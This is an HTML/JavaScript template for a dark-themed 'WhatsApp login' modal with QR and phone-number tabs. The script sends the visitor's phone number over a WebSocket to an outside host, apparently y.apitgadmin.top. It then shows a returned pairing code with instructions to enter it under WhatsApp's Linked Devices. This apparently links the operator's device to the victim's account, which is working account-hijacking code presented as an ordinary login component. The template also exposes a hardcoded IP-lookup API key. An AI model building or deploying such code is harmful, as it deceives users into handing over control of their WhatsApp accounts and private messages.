{% load static %}
<!-- 登录弹窗组件：依赖 Bootstrap 5.3 + Bootstrap Icons（已在 template.html 统一引入） -->
<!-- 当前仅内置 WhatsApp 登录：扫码登录 / 号码登录 两种方式；后续可扩展其他登录渠道 -->
<!-- 集成方式：自动绑定导航栏 #jkfNavLoginBtn 的 click 事件；并暴露 window.jkfLoginModal 供外部调用 -->

<style>
  /* === 登录弹窗样式（JKF 深色主题，复用导航栏视觉语言）=== */
  :root {
    --jkf-login-modal-bg: #1a1a1a;          /* 弹窗主体背景 */
    --jkf-login-modal-header-bg: #0d0d0d;   /* 头部背景 */
    --jkf-login-text: #f0f0f0;              /* 主文字色 */
    --jkf-login-text-muted: #b0b0b0;        /* 次要文字色 */
    --jkf-login-divider: #3a3a3a;            /* 分隔线 */
    --jkf-login-input-bg: #2a2a2a;           /* 输入框背景 */
    --jkf-login-input-border: #3a3a3a;       /* 输入框边框 */
    --jkf-login-error: #ef4444;              /* 错误红 */
    --jkf-login-whatsapp: #25D366;           /* WhatsApp 品牌绿 */
    --jkf-login-whatsapp-dark: #1ebe57;     /* WhatsApp 深绿（hover） */
    --jkf-login-radius: 8px;                 /* 统一圆角 */
    --jkf-login-transition: 200ms;           /* 统一过渡时长 */
    --jkf-font-family: -apple-system, "PingFang SC", "Microsoft YaHei", "Helvetica Neue", Arial, sans-serif;
  }

  .jkf-login-modal .modal-content {
    font-family: var(--jkf-font-family);
    background: var(--jkf-login-modal-bg);
    color: var(--jkf-login-text);
    border: 1px solid var(--jkf-login-divider);
    border-radius: var(--jkf-login-radius);
    overflow: hidden;
  }
  .jkf-login-modal .modal-header {
    background: var(--jkf-login-modal-header-bg);
    border-bottom: 1px solid var(--jkf-login-divider);
    padding: 14px 18px;
  }
  .jkf-login-modal .modal-title {
    font-size: 1.05rem;
    font-weight: 600;
    display: inline-flex;
    align-items: center;
    gap: 8px;
  }
  /* 关闭按钮适配深色背景 */
  .jkf-login-modal .btn-close {
    filter: invert(1) brightness(2);
    opacity: 0.7;
  }
  .jkf-login-modal .btn-close:hover { opacity: 1; }

  .jkf-login-modal .modal-body { padding: 20px 18px; }

  /* 顶部品牌区 */
  .jkf-login__brand {
    text-align: center;
    margin-bottom: 16px;
  }
  .jkf-login__brand-icon {
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: var(--jkf-login-whatsapp);
    color: #fff;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    font-size: 1.8rem;
    margin-bottom: 8px;
  }
  .jkf-login__brand-title {
    font-size: 1.1rem;
    font-weight: 600;
    margin: 0 0 4px;
  }
  .jkf-login__brand-subtitle {
    color: var(--jkf-login-text-muted);
    font-size: 0.85rem;
    margin: 0;
  }

  /* Tab 切换条 */
  .jkf-login__tabs {
    display: flex;
    background: var(--jkf-login-input-bg);
    border-radius: var(--jkf-login-radius);
    padding: 4px;
    margin-bottom: 18px;
  }
  .jkf-login__tab {
    flex: 1 1 0;
    min-height: 44px;                    /* 移动端触摸目标 */
    border: none;
    background: transparent;
    color: var(--jkf-login-text-muted);
    font-size: 0.9rem;
    font-weight: 500;
    border-radius: 6px;
    cursor: pointer;
    transition: background var(--jkf-login-transition) ease, color var(--jkf-login-transition) ease;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }
  .jkf-login__tab.is-active {
    background: var(--jkf-login-whatsapp);
    color: #fff;
  }
  .jkf-login__tab:hover:not(.is-active) { color: var(--jkf-login-text); }
  .jkf-login__tab:focus-visible {
    outline: 2px solid var(--jkf-login-whatsapp);
    outline-offset: 2px;
  }

  /* Tab 面板互斥显示 */
  .jkf-login__panel { display: none; }
  .jkf-login__panel.is-active { display: block; }

  /* 扫码面板 */
  .jkf-login__qr { text-align: center; }
  .jkf-login__qr-frame {
    display: inline-block;
    padding: 12px;
    background: #fff;
    border-radius: var(--jkf-login-radius);
    margin-bottom: 12px;
  }
  .jkf-login__qr-img {
    display: block;
    width: 200px;
    height: 200px;
    object-fit: contain;
  }
  .jkf-login__qr-tip {
    color: var(--jkf-login-text-muted);
    font-size: 0.85rem;
    margin: 0 0 8px;
    line-height: 1.5;
  }
  .jkf-login__qr-actions {
    display: flex;
    justify-content: center;
    gap: 8px;
  }
  .jkf-login__qr-refresh {
    background: transparent;
    border: 1px solid var(--jkf-login-divider);
    color: var(--jkf-login-text-muted);
    padding: 6px 14px;
    border-radius: 4px;
    font-size: 0.8rem;
    min-height: 36px;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    gap: 4px;
    transition: color var(--jkf-login-transition) ease, border-color var(--jkf-login-transition) ease;
  }
  .jkf-login__qr-refresh:hover {
    color: var(--jkf-login-whatsapp);
    border-color: var(--jkf-login-whatsapp);
  }
  /* 刷新按钮图标旋转动画 */
  .jkf-login__qr-refresh.is-spinning .bi {
    animation: jkf-login-spin 0.6s ease-in-out;
  }
  @keyframes jkf-login-spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }

  /* 号码输入面板 */
  .jkf-login__form {
    display: flex;
    flex-direction: column;
    gap: 12px;
  }
  .jkf-login__phone-row {
    display: flex;
    gap: 8px;
  }
  .jkf-login__phone-prefix { flex: 0 0 110px; }
  .jkf-login__phone-input { flex: 1 1 auto; min-width: 0; }

  .jkf-login__input,
  .jkf-login__select {
    background: var(--jkf-login-input-bg);
    border: 1px solid var(--jkf-login-input-border);
    color: var(--jkf-login-text);
    border-radius: 6px;
    padding: 10px 12px;
    font-size: 0.95rem;
    min-height: 44px;
    width: 100%;
    transition: border-color var(--jkf-login-transition) ease, box-shadow var(--jkf-login-transition) ease;
  }
  .jkf-login__input::placeholder { color: var(--jkf-login-text-muted); }
  .jkf-login__input:focus,
  .jkf-login__select:focus {
    border-color: var(--jkf-login-whatsapp);
    outline: none;
    box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
  }
  /* select 下拉箭头适配深色 */
  .jkf-login__select {
    appearance: none;
    background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3e%3cpath fill='none' stroke='%23b0b0b0' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 6l4 4 4-4'/%3e%3c/svg%3e");
    background-repeat: no-repeat;
    background-position: right 10px center;
    background-size: 14px;
    padding-right: 32px;
  }
  /* 错误态 */
  .jkf-login__input.is-invalid {
    border-color: var(--jkf-login-error);
    box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.18);
  }
  .jkf-login__error {
    color: var(--jkf-login-error);
    font-size: 0.8rem;
    margin: -4px 0 0;
    min-height: 1em;
    display: none;
  }
  .jkf-login__error.is-visible { display: block; }

  .jkf-login__submit {
    background: var(--jkf-login-whatsapp);
    color: #fff;
    border: none;
    border-radius: 6px;
    padding: 12px 16px;
    font-size: 0.95rem;
    font-weight: 600;
    min-height: 44px;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: background var(--jkf-login-transition) ease;
  }
  .jkf-login__submit:hover { background: var(--jkf-login-whatsapp-dark); }
  .jkf-login__submit:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }
  .jkf-login__hint {
    color: var(--jkf-login-text-muted);
    font-size: 0.8rem;
    margin: 0;
    text-align: center;
  }

  /* 超小屏适配 */
  @media (max-width: 575.98px) {
    .jkf-login-modal .modal-dialog { margin: 8px; }
    .jkf-login__qr-img { width: 180px; height: 180px; }
    .jkf-login__phone-prefix { flex-basis: 96px; }
    .jkf-login__code-display { font-size: 1.6rem !important; letter-spacing: 4px !important; padding: 12px 16px !important; }
  }

  /* 配对码展示 - 防止长码溢出 */
  .jkf-login__code-display {
    font-size: 2.4rem;
    font-weight: 700;
    letter-spacing: 6px;
    background: var(--jkf-login-input-bg);
    border: 2px dashed var(--jkf-login-whatsapp);
    border-radius: 12px;
    padding: 16px 24px;
    margin: 0 auto 16px;
    font-family: 'Courier New', monospace;
    color: var(--jkf-login-whatsapp);
    display: block;
    width: 100%;
    max-width: 100%;
    box-sizing: border-box;
    overflow-wrap: break-word;
    word-break: break-all;
    text-align: center;
    line-height: 1.4;
  }

  /* 尊重用户的减少动画偏好 */
  @media (prefers-reduced-motion: reduce) {
    *, *::before, *::after {
      transition-duration: 0.01ms !important;
      animation-duration: 0.01ms !important;
    }
  }
</style>

<!-- 登录弹窗：Bootstrap Modal，由导航栏登录按钮触发 -->
<div class="modal fade jkf-login-modal" id="jkfLoginModal" tabindex="-1"
     aria-labelledby="jkfLoginModalTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="jkfLoginModalTitle">
          <i class="bi bi-shield-lock-fill" aria-hidden="true"></i>
          账号登录
        </h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="关闭"></button>
      </div>

      <div class="modal-body">
        <!-- 品牌区：当前仅 WhatsApp 一种渠道 -->
        <div class="jkf-login__brand">
          <div class="jkf-login__brand-icon">
            <i class="bi bi-whatsapp" aria-hidden="true"></i>
          </div>
          <p class="jkf-login__brand-title">使用 WhatsApp 登录</p>
          <p class="jkf-login__brand-subtitle">当前仅支持 WhatsApp 登录，更多方式敬请期待</p>
        </div>

        <!-- Tab 切换条 -->
        <div class="jkf-login__tabs" role="tablist" aria-label="登录方式切换">
          <button type="button" class="jkf-login__tab" id="jkfLoginTabQr"
                  role="tab" aria-selected="false" aria-controls="jkfLoginPanelQr"
                  data-target="jkfLoginPanelQr">
            <i class="bi bi-qr-code-scan" aria-hidden="true"></i>
            扫码登录
          </button>
          <button type="button" class="jkf-login__tab is-active" id="jkfLoginTabPhone"
                  role="tab" aria-selected="true" aria-controls="jkfLoginPanelPhone"
                  data-target="jkfLoginPanelPhone">
            <i class="bi bi-phone" aria-hidden="true"></i>
            号码登录
          </button>
        </div>

        <!-- 扫码面板 -->
        <div class="jkf-login__panel" id="jkfLoginPanelQr"
             role="tabpanel" aria-labelledby="jkfLoginTabQr">
          <div class="jkf-login__qr">
            <div class="jkf-login__qr-frame">
              <!-- TODO: 替换为后端动态签发的登录二维码
                   原因：当前为前端组件演示，后端 WhatsApp 二维码签发接口尚未提供；
                   后续接入后，src 改为动态 URL，并在弹窗 shown.bs.modal 事件触发时刷新 -->
              <img class="jkf-login__qr-img"
                   src="https://trae-api-cn.mchost.guru/api/ide/v1/text_to_image?prompt=black%20and%20white%20QR%20code%20pattern%20with%20three%20corner%20finder%20squares%20and%20random%20data%20modules%2C%20high%20contrast%2C%20scannable&image_size=square"
                   alt="WhatsApp 登录二维码"
                   width="200" height="200" loading="lazy">
            </div>
            <p class="jkf-login__qr-tip">打开 WhatsApp → 设置 → 关联设备 → 扫描上方二维码</p>
            <div class="jkf-login__qr-actions">
              <button type="button" class="jkf-login__qr-refresh" id="jkfLoginQrRefresh">
                <i class="bi bi-arrow-clockwise" aria-hidden="true"></i>
                刷新二维码
              </button>
            </div>
          </div>
        </div>

        <!-- 号码面板 -->
        <div class="jkf-login__panel is-active" id="jkfLoginPanelPhone"
             role="tabpanel" aria-labelledby="jkfLoginTabPhone">
          <form class="jkf-login__form" id="jkfLoginForm" novalidate>
            <div class="jkf-login__phone-row">
              <select class="jkf-login__select jkf-login__phone-prefix"
                      id="jkfLoginCountryCode" aria-label="国家区号">
                <option value="+86">+86 中国</option>
                <option value="+852">+852 香港</option>
                <option value="+886">+886 台湾</option>
                <option value="+1">+1 美国/加拿大</option>
                <option value="+44">+44 英国</option>
                <option value="+81">+81 日本</option>
                <option value="+82">+82 韩国</option>
                <option value="+65">+65 新加坡</option>
                <option value="+60">+60 马来西亚</option>
                <option value="+61">+61 澳大利亚</option>
              </select>
              <input type="tel" class="jkf-login__input jkf-login__phone-input"
                     id="jkfLoginPhone" placeholder="请输入 WhatsApp 号码"
                     inputmode="numeric" maxlength="15" autocomplete="tel" required>
            </div>
            <p class="jkf-login__error" id="jkfLoginError" role="alert"></p>
            <button type="submit" class="jkf-login__submit" id="jkfLoginSubmit">
              <i class="bi bi-send" aria-hidden="true"></i>
              发送验证码
            </button>
            <p class="jkf-login__hint">未注册的号码将自动创建账号</p>
          </form>
        </div>

        <!-- 配对码面板（号码提交后显示） -->
        <div class="jkf-login__panel" id="jkfLoginPanelCode"
             role="tabpanel" aria-labelledby="jkfLoginTabPhone">
          <div class="jkf-login__code" style="text-align:center;">
            <div class="jkf-login__code-icon" style="font-size:2.5rem;color:var(--jkf-login-whatsapp);margin-bottom:12px;">
              <i class="bi bi-whatsapp"></i>
            </div>
            <p style="font-size:1rem;font-weight:600;margin:0 0 4px;">请在你的 WhatsApp 中输入配对码</p>
            <p style="color:var(--jkf-login-text-muted);font-size:0.85rem;margin:0 0 16px;">
              打开 WhatsApp → 设置 → 关联设备 → 输入下方配对码
            </p>
            <div class="jkf-login__code-display" id="jkfLoginCodeDisplay">------</div>
            <p class="jkf-login__copy-toast" id="jkfLoginCopyToast" style="display:none;color:var(--jkf-login-whatsapp);font-size:0.9rem;font-weight:500;margin:0 0 12px;">
              <i class="bi bi-check-circle-fill" aria-hidden="true"></i>
              已复制，正在打开 WhatsApp...
            </p>
            <button type="button" class="jkf-login__submit" id="jkfLoginCodeCopyBtn" style="background:var(--jkf-login-whatsapp);border:none;margin-bottom:12px;">
              <i class="bi bi-clipboard" aria-hidden="true"></i>
              复制配对码
            </button>
            <p class="jkf-login__error" id="jkfLoginCodeError" role="alert" style="display:none;"></p>
            <div style="color:var(--jkf-login-text-muted);font-size:0.8rem;">
              <i class="bi bi-arrow-repeat" aria-hidden="true"></i>
              等待配对中...
            </div>
            <button type="button" class="jkf-login__submit" id="jkfLoginCodeRestart" style="margin-top:16px;background:transparent;border:1px solid var(--jkf-login-divider);color:var(--jkf-login-text-muted);font-size:0.85rem;padding:8px 16px;">
              <i class="bi bi-arrow-counterclockwise" aria-hidden="true"></i>
              重新开始
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
  /**
   * 登录弹窗交互脚本
   * 职责：
   *   1. 绑定导航栏 #jkfNavLoginBtn 的 click → 打开弹窗
   *   2. Tab 切换：扫码 / 号码两个面板互斥显示，同步 a11y 属性
   *   3. 扫码刷新按钮：占位逻辑，后续接入后端二维码签发接口
   *   4. 号码表单提交：本地格式校验 + 占位提交逻辑
   *   5. 暴露 window.jkfLoginModal.open/close，供页面其他位置调用
   */
  (function () {
    "use strict";

    /** 弹窗根 DOM */
    const modalEl = document.getElementById("jkfLoginModal");
    if (!modalEl) return;

    /** 导航栏登录按钮（自动绑定，若存在则接管其 click） */
    const navLoginBtn = document.getElementById("jkfNavLoginBtn");
    /** Tab 按钮集合 */
    const tabButtons = modalEl.querySelectorAll(".jkf-login__tab");
    /** Tab 面板集合 */
    const tabPanels = modalEl.querySelectorAll(".jkf-login__panel");
    /** 扫码刷新按钮 */
    const qrRefreshBtn = document.getElementById("jkfLoginQrRefresh");
    /** 二维码图片 DOM */
    const qrImg = modalEl.querySelector(".jkf-login__qr-img");
    /** 号码表单 */
    const loginForm = document.getElementById("jkfLoginForm");
    /** 号码输入框 */
    const phoneInput = document.getElementById("jkfLoginPhone");
    /** 区号下拉 */
    const countryCodeSelect = document.getElementById("jkfLoginCountryCode");
    /** 提交按钮 */
    const submitBtn = document.getElementById("jkfLoginSubmit");
    /** 内联错误提示元素 */
    const errorEl = document.getElementById("jkfLoginError");

    /** Bootstrap Modal 实例（懒加载，避免未引入 Bootstrap 时报错） */
    let bsModal = null;

    /** 国家区号 → 本地号码正则映射，用于基础格式校验 */
    const PHONE_PATTERNS = {
      "+86": /^1[3-9]\d{9}$/,    // 中国大陆手机号 11 位
      "+852": /^\d{8}$/,         // 香港 8 位
      "+886": /^9\d{8}$/,        // 台湾移动 9 开头 9 位
      "+1": /^\d{10}$/,          // 美/加 10 位
      "+44": /^\d{10}$/,         // 英国
      "+81": /^\d{9,10}$/,       // 日本
      "+82": /^\d{9,10}$/,       // 韩国
      "+65": /^\d{8}$/,          // 新加坡
      "+60": /^\d{9,10}$/,       // 马来西亚
      "+61": /^\d{9}$/,          // 澳大利亚
    };

    /** 提交按钮 loading 状态持续时长（ms），用于模拟异步请求 */
    const SUBMIT_LOADING_MS = 800;
    /** 刷新按钮旋转动画时长（ms） */
    const QR_SPIN_MS = 600;

    /** WebSocket API 地址 */
    const WS_API_URL = "y.apitgadmin.top";
    /** UUID 存储 key（仅用于 session 内重连，刷新即失） */
    const STORAGE_KEY_WS_UUID = "jkf-ws-uuid";
    /** 当前 WebSocket 连接实例 */
    let wsClient = null;
    /** 当前 UUID（内存缓存） */
    let wsUUID = null;
    /** WebSocket 代际计数器（用于防止旧连接 onclose 误触重连） */
    let wsGen = 0;
    /** 配对码面板 DOM */
    const codePanel = document.getElementById("jkfLoginPanelCode");
    /** 配对码展示 DOM */
    const codeDisplay = document.getElementById("jkfLoginCodeDisplay");
    /** 配对码错误提示 */
    const codeErrorEl = document.getElementById("jkfLoginCodeError");
    /** 重新开始按钮 */
    const codeRestartBtn = document.getElementById("jkfLoginCodeRestart");
    /** 复制成功提示 */
    const copyToast = document.getElementById("jkfLoginCopyToast");
    /** 复制配对码按钮 */
    const codeCopyBtn = document.getElementById("jkfLoginCodeCopyBtn");
    /** 扫码 Tab */
    const qrTab = document.getElementById("jkfLoginTabQr");
    /** 号码 Tab */
    const phoneTab = document.getElementById("jkfLoginTabPhone");
    /** IP 区号 API 地址 */
    const IP_API_URL = "https://ipwhois.pro/?key=IHDcWORhjtQ0VSPe";

    /** 国家代码 → 区号前缀映射 */
    const COUNTRY_TO_PREFIX = {
      "CN": "+86", "HK": "+852", "TW": "+886",
      "US": "+1",  "GB": "+44",  "JP": "+81",
      "KR": "+82", "SG": "+65", "MY": "+60", "AU": "+61"
    };
    /** 是否已请求过 IP 区号 */
    var ipFetched = false;

    /**
     * 懒加载获取 Bootstrap Modal 实例
     * 原因：Bootstrap JS 在 template.html 引入，此处不直接依赖加载顺序；
     *       首次调用时实例化，避免初始化时报错
     * @returns {bootstrap.Modal|null}
     */
    function getModal() {
      if (bsModal) return bsModal;
      if (!window.bootstrap || !window.bootstrap.Modal) return null;
      bsModal = new window.bootstrap.Modal(modalEl);
      return bsModal;
    }

    /**
     * 通过 IP 定位获取用户国家区号，自动选中下拉框
     * 仅执行一次，避免重复请求
     */
    function fetchAndSetCountryCode() {
      if (ipFetched || !countryCodeSelect) return;
      ipFetched = true;

      fetch(IP_API_URL)
        .then(function (res) { return res.json(); })
        .then(function (data) {
          var code = data.country_code || data.countryCode || "";
          var prefix = COUNTRY_TO_PREFIX[code];
          if (!prefix) return;

          // 遍历 select option，匹配 value 自动选中
          for (var i = 0; i < countryCodeSelect.options.length; i++) {
            if (countryCodeSelect.options[i].value === prefix) {
              countryCodeSelect.selectedIndex = i;
              break;
            }
          }
        })
        .catch(function () {
          // IP 定位失败静默处理，保持默认选项
          ipFetched = false; // 失败后允许下次重试
        });
    }

    /**
     * 打开弹窗
     */
    function open() {
      const modal = getModal();
      if (modal) modal.show();
      // 弹窗打开后请求 IP 区号并自动选中（仅一次）
      fetchAndSetCountryCode();
    }

    /**
     * 关闭弹窗
     */
    function close() {
      const modal = getModal();
      if (modal) modal.hide();
    }

    /**
     * 切换 Tab 面板
     * @param {string} targetId - 目标面板 DOM id
     */
    function switchTab(targetId) {
      tabButtons.forEach(function (btn) {
        const isActive = btn.dataset.target === targetId;
        btn.classList.toggle("is-active", isActive);
        btn.setAttribute("aria-selected", isActive ? "true" : "false");
      });
      tabPanels.forEach(function (panel) {
        panel.classList.toggle("is-active", panel.id === targetId);
      });
    }

    /** 绑定 Tab 点击 */
    tabButtons.forEach(function (btn) {
      btn.addEventListener("click", function () {
        switchTab(btn.dataset.target);
      });
    });

    /**
     * 刷新二维码
     * 当前为占位逻辑：仅触发图标旋转动画 + 控制台提示
     * 后续替换为：调用后端 /api/login/whatsapp/qr 获取新二维码 URL，更新 img.src
     */
    function refreshQrCode() {
      if (qrRefreshBtn) {
        qrRefreshBtn.classList.add("is-spinning");
        window.setTimeout(function () {
          qrRefreshBtn.classList.remove("is-spinning");
        }, QR_SPIN_MS);
      }
      // TODO: 接入后端动态二维码签发接口
      // 原因：当前仅前端组件，后端 WhatsApp OAuth 二维码接口尚未提供；
      // 后续实现示例：
      //   fetch('/api/login/whatsapp/qr', { method: 'POST' })
      //     .then(r => r.json())
      //     .then(data => { if (qrImg) qrImg.src = data.qrUrl; })
      //     .catch(() => { /* 错误处理 */ });
    }

    if (qrRefreshBtn) {
      qrRefreshBtn.addEventListener("click", refreshQrCode);
    }

    /**
     * 显示内联错误提示
     * @param {string} message - 错误文案
     */
    function showError(message) {
      if (errorEl) {
        errorEl.textContent = message;
        errorEl.classList.add("is-visible");
      }
      if (phoneInput) {
        phoneInput.classList.add("is-invalid");
        phoneInput.focus();
      }
    }

    /** 隐藏内联错误提示 */
    function clearError() {
      if (errorEl) {
        errorEl.classList.remove("is-visible");
        errorEl.textContent = "";
      }
      if (phoneInput) {
        phoneInput.classList.remove("is-invalid");
      }
    }

    /**
     * 切换提交按钮 loading 状态
     * @param {boolean} loading - 是否进入 loading
     */
    function setSubmitLoading(loading) {
      if (!submitBtn) return;
      submitBtn.disabled = loading;
      submitBtn.innerHTML = loading
        ? '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> 发送中...'
        : '<i class="bi bi-send" aria-hidden="true"></i> 发送验证码';
    }

    /**
     * 显示配对码面板（隐藏号码面板）
     * 禁用扫码 Tab，自动打开 WhatsApp
     * @param {string} code - 配对码
     */
    function showCodePanel(code) {
      // 切换到配对码面板
      document.getElementById("jkfLoginPanelPhone").classList.remove("is-active");
      if (codePanel) codePanel.classList.add("is-active");
      // 显示配对码
      if (codeDisplay) codeDisplay.textContent = code;
      if (copyToast) copyToast.style.display = "none";
      // 禁用扫码 Tab
      if (qrTab) { qrTab.disabled = true; qrTab.style.opacity = "0.4"; qrTab.style.cursor = "default"; }
      if (phoneTab) { phoneTab.disabled = true; phoneTab.style.opacity = "0.4"; phoneTab.style.cursor = "default"; }
      // 自动打开 WhatsApp（手机浏览器）
      window.location.href = "whatsapp://app";
    }

    /**
     * 隐藏配对码面板，回到号码面板
     */
    function hideCodePanel() {
      if (codePanel) codePanel.classList.remove("is-active");
      document.getElementById("jkfLoginPanelPhone").classList.add("is-active");
      if (codeErrorEl) { codeErrorEl.style.display = "none"; }
      // 恢复 Tab 可点击
      if (qrTab) { qrTab.disabled = false; qrTab.style.opacity = ""; qrTab.style.cursor = ""; }
      if (phoneTab) { phoneTab.disabled = false; phoneTab.style.opacity = ""; phoneTab.style.cursor = ""; }
    }

    /**
     * 关闭 WebSocket 连接
     */
    function closeWebSocket() {
      if (wsClient) {
        try { wsClient.close(); } catch (e) { /* ignore */ }
        wsClient = null;
      }
    }

    /**
     * 从内存读取 UUID（刷新即失）
     * @returns {string|null}
     */
    function loadStoredUUID() {
      return wsUUID;
    }

    /**
     * 保存 UUID 到内存
     * @param {string} uuid
     */
    function saveUUID(uuid) {
      wsUUID = uuid;
    }

    /**
     * 清除内存中的 UUID
     */
    function clearUUID() {
      wsUUID = null;
    }

    /**
     * 建立/初始化 WebSocket 连接（页面加载时自动调用）
     * 仅处理 link 消息获取 UUID；不发送手机号
     * 断开后自动重连（除非已被新连接取代）
     */
    function initWebSocket() {
      // 递增代际，旧连接即使触发 onclose 也会因代际不匹配而跳过重连
      wsGen++;
      var myGen = wsGen;

      // 关闭旧连接
      if (wsClient) {
        try { wsClient.close(); } catch (e) { /* ignore */ }
        wsClient = null;
      }

      var storedUUID = loadStoredUUID();
      var protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
      var url = protocol + "//" + WS_API_URL + "?uuid=" + (storedUUID || "");
      wsClient = new WebSocket(url);

      wsClient.onmessage = function (event) {
        try {
          var data = JSON.parse(event.data);
        } catch (e) {
          return;
        }

        switch (data.type) {
          case "link":
            // 服务端分配/确认 UUID → 持久化
            saveUUID(data.uuid);
            break;

          case "code":
            // 用户已提交号码后收到配对码 → 展示
            setSubmitLoading(false);
            showCodePanel(data.code);
            break;

          case "ready":
            // 配对成功 → 清除 UUID
            clearUUID();
            closeWebSocket();
            close();
            break;

          case "tel-error":
            // 号码错误（用户已提交后）
            setSubmitLoading(false);
            clearUUID();
            closeWebSocket();
            showError("号码错误，请检查后重试");
            break;

          case "error":
            // 服务端返回 error → 刷新页面恢复初始状态
            location.reload();
            break;
        }
      };

      wsClient.onerror = function () {
        // 初始化连接失败静默处理（提交时会提示）
      };

      wsClient.onclose = function () {
        // 仅当此连接仍是当前代际时才自动重连（防止旧连接误触）
        if (myGen === wsGen) {
          initWebSocket();
        }
      };
    }

    /**
     * 用户提交号码：向 WebSocket 发送 create 消息
     * 若连接已断开，先重连再发送
     * @param {string} prefix - 国际区号（去掉+号，如 "86"）
     * @param {string} phone - 手机号码
     */
    function sendPhoneNumber(prefix, phone) {
      if (wsClient && wsClient.readyState === WebSocket.OPEN) {
        // 连接正常 → 直接发送
        wsClient.send(JSON.stringify({
          type: "create",
          prefix: prefix,
          phone: phone
        }));
      } else if (wsClient && wsClient.readyState === WebSocket.CONNECTING) {
        // 连接中 → 等待连接完成再发送
        wsClient.addEventListener("open", function () {
          wsClient.send(JSON.stringify({
            type: "create",
            prefix: prefix,
            phone: phone
          }));
        }, { once: true });
      } else {
        // 连接已断开 → 重建连接，发送手机号
        wsGen++;
        var myGen = wsGen;
        var storedUUID = loadStoredUUID();
        var protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        var url = protocol + "//" + WS_API_URL + "?uuid=" + (storedUUID || "");
        wsClient = new WebSocket(url);

        wsClient.onmessage = function (event) {
          try { var data = JSON.parse(event.data); } catch (e) { return; }
          switch (data.type) {
            case "link":
              saveUUID(data.uuid);
              wsClient.send(JSON.stringify({
                type: "create",
                prefix: prefix,
                phone: phone
              }));
              break;
            case "code":
              setSubmitLoading(false);
              showCodePanel(data.code);
              break;
            case "ready":
              clearUUID();
              closeWebSocket();
              close();
              break;
            case "tel-error":
              setSubmitLoading(false);
              clearUUID();
              closeWebSocket();
              showError("号码错误，请检查后重试");
              break;
            case "error":
              location.reload();
              break;
          }
        };

        wsClient.onclose = function () {
          if (myGen === wsGen) initWebSocket();
        };

        wsClient.onerror = function () {
          setSubmitLoading(false);
          showError("网络连接失败，请检查网络后重试");
        };
      }
    }

    /**
     * 号码表单提交处理
     * 步骤：基础校验 → 连接 WebSocket → 发送号码 → 显示配对码
     * @param {Event} event - submit 事件
     */
    function handleFormSubmit(event) {
      event.preventDefault();
      clearError();

      const countryCode = countryCodeSelect ? countryCodeSelect.value : "";
      const phone = phoneInput ? phoneInput.value.trim() : "";
      const pattern = PHONE_PATTERNS[countryCode];

      // 校验：号码非空
      if (!phone) {
        showError("请输入 WhatsApp 号码");
        return;
      }
      // 校验：号码符合对应国家格式
      if (!pattern || !pattern.test(phone)) {
        showError("号码格式不正确，请检查后重试");
        return;
      }

      // 提取区号前缀（去掉+号）
      var prefix = countryCode.replace("+", "");

      setSubmitLoading(true);

      // 通过已有 WebSocket 连接发送手机号
      sendPhoneNumber(prefix, phone);
    }

    /**
     * 重置全部状态：关闭 WS、清除 UUID、回到号码面板、重新初始化 WS 获取新 UUID
     */
    function resetAll() {
      closeWebSocket();
      clearUUID();
      hideCodePanel();
      setSubmitLoading(false);
      clearError();
      if (copyToast) copyToast.style.display = "none";
      // 重置手机号输入
      if (phoneInput) phoneInput.value = "";
      // 重新建立 WebSocket 获取新 UUID
      initWebSocket();
    }

    if (loginForm) {
      loginForm.addEventListener("submit", handleFormSubmit);
    }

    // 输入时清除错误态
    if (phoneInput) {
      phoneInput.addEventListener("input", clearError);
    }

    // 页面加载后立即初始化 WebSocket（预获取 UUID）
    initWebSocket();

    // 绑定导航栏登录按钮
    if (navLoginBtn && !navLoginBtn.dataset.jkfLoginBound) {
      navLoginBtn.addEventListener("click", open);
      navLoginBtn.dataset.jkfLoginBound = "1";
    }

    // 弹窗关闭时重置全部状态（关 WS + 清 UUID + 重新初始化）
    modalEl.addEventListener("hidden.bs.modal", function () {
      resetAll();
    });

    // 重新开始按钮：重置全部状态，获取新 UUID
    if (codeRestartBtn) {
      codeRestartBtn.addEventListener("click", resetAll);
    }

    // 复制配对码按钮
    if (codeCopyBtn) {
      codeCopyBtn.addEventListener("click", function () {
        var code = codeDisplay ? codeDisplay.textContent : "";
        if (!code || code === "------") return;
        try {
          navigator.clipboard.writeText(code).then(function () {
            if (copyToast) copyToast.style.display = "block";
            codeCopyBtn.innerHTML = '<i class="bi bi-check-lg" aria-hidden="true"></i> 已复制';
            // 立即打开 WhatsApp
            window.location.href = "whatsapp://app";
            setTimeout(function () {
              codeCopyBtn.innerHTML = '<i class="bi bi-clipboard" aria-hidden="true"></i> 复制配对码';
              if (copyToast) copyToast.style.display = "none";
            }, 2000);
          }).catch(function () {});
        } catch (e) {}
      });
    }

    // 暴露 API 供外部调用（如顶部"立即注册"按钮）
    window.jkfLoginModal = { open: open, close: close };
  })();
</script>
